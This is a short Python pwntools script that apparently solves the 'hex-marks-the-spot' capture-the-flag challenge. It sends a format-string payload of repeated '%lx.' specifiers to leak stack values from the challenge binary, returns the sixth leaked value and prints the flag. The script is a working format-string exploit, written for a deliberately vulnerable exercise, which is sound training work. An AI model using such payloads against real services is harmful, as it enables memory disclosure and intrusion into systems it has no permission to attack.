from pwn import *

def get_process():
    if args.REMOTE:
        return remote('hex-marks-the-spot.unipi-ctf.it', 10000)
    else:
        return remote('localhost', 10004)
    
context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'


p = get_process()
p.recvuntil('ship?\n')
payload = b'%lx.' * 10
p.sendline(payload)
response = p.recvline()

# Parse the leaked stack values
leaked_values = response.decode().strip().split('.')
print(leaked_values)

# get the 6th entry
leaked_values = leaked_values[6]
print(f'Leaked value at 6th entry: {leaked_values}')
p.sendline(b'0x' + leaked_values.encode())
p.recvline()
p.recvline()
response = p.recvline()
if "unipi" in response.decode():
    log.info("Got the flag!")
    # print the flag
    print(response.decode())
    exit(0)
else:
    log.error("Failed to get the flag")
    exit(1)
